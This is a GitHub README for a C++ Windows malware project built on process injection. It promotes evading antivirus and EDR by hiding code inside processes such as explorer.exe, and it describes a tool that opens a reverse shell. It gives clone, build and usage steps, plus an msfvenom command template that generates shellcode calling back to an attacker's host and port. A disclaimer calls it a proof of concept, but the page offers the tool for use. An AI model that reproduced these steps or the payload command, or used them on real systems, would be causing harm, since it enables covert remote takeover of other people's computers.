
<div>
    <img src="https://img.shields.io/badge/Language%20-C++-darkred.svg" style="max-width: 100%;">
    <img src="https://img.shields.io/badge/Tools%20-Windows API-green.svg" style="max-width: 100%;">
    <img src="https://img.shields.io/badge/Target OS%20-Windows 7..11-blue.svg" style="max-width: 100%;">
    <img src="https://img.shields.io/badge/Project%20-Malware | Process Injection-grey.svg" style="max-width: 100%;">
</div>


# Simple Windows malware | Process injection

Simple payload for hacking Windows and process injection. Using the windows API. 

* **Windows API:** https://learn.microsoft.com/pt-br/windows/win32/apiindex/windows-api-list

### **Process injection**

Process injection is an evasive attack method, that hackers use to gain access to the system by executing their malicious code in the address space of a legitimate process, hiding the malware and often not generating any suspicion about an attacker on the system, as the malicious code becomes difficult to detect. Process injections also evade detection by any antivirus, application control, or endpoint detection and response systems running on the network, because the infected processes are viewed as legitimate. 

Hackers usually use less suspicious or more important system processes such as: svchost.exe, rundll32.exe or even explorer.exe.

* **Explorer_injection.exe:** Performs a shell connection on the reverse target computer at the execution address of the explorer.exe process. 

#

```bash
  tasklist | findstr <process name>
```
=> CMD syntax: `Process_injection.exe <PID>`

# Compiling | Install

* **Installation:** 
```bash 
git clone https://github.com/Jsmoreira02/Wind0wsM4lware_.git
cd Wind0wsM4lware_
make
```

* **Compiling just one of the files with "Makefile":** `make Process_injection` `make Win_malware` `make explorer_injection`

* **Compiling the code (Windows):** `g++ code.c -o code` or `make (In case mingw-w64 is installed)`

# MinGW-w64 Instalation:

**Debian/Ubuntu OS:** 
```bash 
sudo apt install mingw-w64-x86-64 (64-bits)
or
sudo apt install mingw-w64 (32-bits)
```

**Fedora**:
```bash 
sudo dnf install mingw64-gcc-c++
```

**Arch Linux**:
```bash 
sudo pacman -S mingw-w64-gcc
```

=> More Info: https://www.mingw-w64.org/

=> Shellcode generator: `msfvenom -p <Payload> LHOST=<IP> LPORT=<LOCAL PORT> --platform windows --arch <x64/x86> -f c`

# Warning:    
> I am not responsible for any illegal use or damage caused by this tool. It primarily serves as a proof of concept and it won't guarantee success in real-world situations
